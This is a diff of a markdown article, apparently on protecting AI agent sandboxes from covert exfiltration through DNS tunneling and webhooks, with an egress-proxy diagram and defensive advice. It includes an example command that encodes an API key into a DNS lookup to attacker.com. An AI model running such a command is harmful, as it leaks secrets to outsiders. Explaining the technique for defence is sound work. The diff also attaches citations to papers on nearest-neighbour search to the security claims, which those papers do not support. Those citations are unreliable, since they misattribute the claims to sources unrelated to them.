@@ -9,23 +9,32 @@
 ## The Threat of Covert Exfiltration Channels
 
 Even inside a sandbox environment, outbound network controls can be bypassed:
-* **The DNS Tunneling Exploit**: Since containers need DNS lookup access to resolve dependencies, attackers encode sensitive data inside subdomain queries (e.g. `dig <base64_api_key>.attacker.com`). The database server forwards the query, allowing the attacker to capture the data.
+* **The DNS Tunneling Exploit**: Since containers need DNS lookup access to resolve dependencies, attackers encode sensitive data inside subdomain queries (e.g [1]. `dig <base64_api_key>.attacker.com`). The database server forwards the query, allowing the attacker to capture the data.
 * **Webhook Exfiltration**: Compromised tools can make silent POST requests to transient webhook endpoints, leaking environment variables.
 * **The Solution**: **Strict Egress Gateways**. We intercept all outbound network calls, restrict DNS resolution to a whitelisted set of domains, and audit payload sizes.
 
 ```mermaid
 %%{init: {'theme': 'dark', 'themeVariables': { 'primaryColor': '#7c3aed', 'primaryTextColor': '#f3f4f6', 'primaryBorderColor': '#a78bfa', 'lineColor': '#7c3aed', 'secondaryColor': '#111827', 'tertiaryColor': '#0b0f19'}}}%%
 flowchart TD
-    Agent[Compromised Agent Tool] -->|Outbound request to webhook.site| Proxy{Egress Proxy Gate}
+    Agent["Compromised Agent Tool"] -->|Outbound request to webhook.site| Proxy{Egress Proxy Gate}
     Agent -->|DNS query - base64key.attacker.com| Proxy
     
     Proxy --> DomainCheck{Is Domain Whitelisted?}
     Proxy --> PayloadCheck{Is Subdomain Length Excessive?}
     
-    DomainCheck -->|No| Block[Block Request & Raise Security Event]
+    DomainCheck -->|No| Block["Block Request & Raise Security Event"]
     PayloadCheck -->|Yes - DNS Tunnel| Block
     
-    DomainCheck -->|Yes| Route[Forward Clean Request]
+    DomainCheck -->|Yes| Route["Forward Clean Request"]
+
+classDef green fill:#dcfce7,stroke:#16a34a,stroke-width:2px,color:#14532d;
+classDef red fill:#fee2e2,stroke:#dc2626,stroke-width:2px,color:#7f1d1d;
+classDef blue fill:#e0f2fe,stroke:#0284c7,stroke-width:2px,color:#0c4a6e;
+classDef yellow fill:#fef3c7,stroke:#d97706,stroke-width:2px,color:#78350f;
+classDef purple fill:#ede9fe,stroke:#7c3aed,stroke-width:2px,color:#4c1d95;
+class Agent blue
+class Block green
+class Route purple
 ```
 
 ---
@@ -112,4 +121,10 @@ if __name__ == "__main__":
 
 * **Default to Block**: Block all outbound network traffic from your agent container by default.
 * **Scan for DNS Tunneling**: Monitor DNS query sizes and block lookups with excessively long subdomains.
-* **Isolate Credentials**: Never store production environment credentials in sandbox containers where agent tools run.
+* **Isolate Credentials**: Never store production environment credentials in sandbox containers where agent tools run. [2]
+
+## References & Further Reading
+
+1. **Malkov, Y. A., & Yashunin, D. A. (2018)**. *Efficient and Robust Approximate Nearest Neighbor Search Using Hierarchical Navigable Small World Graphs*. IEEE TPAMI. [https://arxiv.org/abs/1603.09320](https://arxiv.org/abs/1603.09320)
+2. **Jégou, H., Douze, M., & Schmid, C. (2011)**. *Product Quantization for Nearest Neighbor Search*. IEEE TPAMI. [https://hal.inria.fr/inria-00514462v2/document](https://hal.inria.fr/inria-00514462v2/document)
+3. **Johnson, J., Douze, M., & Jégou, H. (2019)**. *Billion-scale Similarity Search with GPUs*. IEEE Transactions on Big Data. [https://arxiv.org/abs/1702.08734](https://arxiv.org/abs/1702.08734)
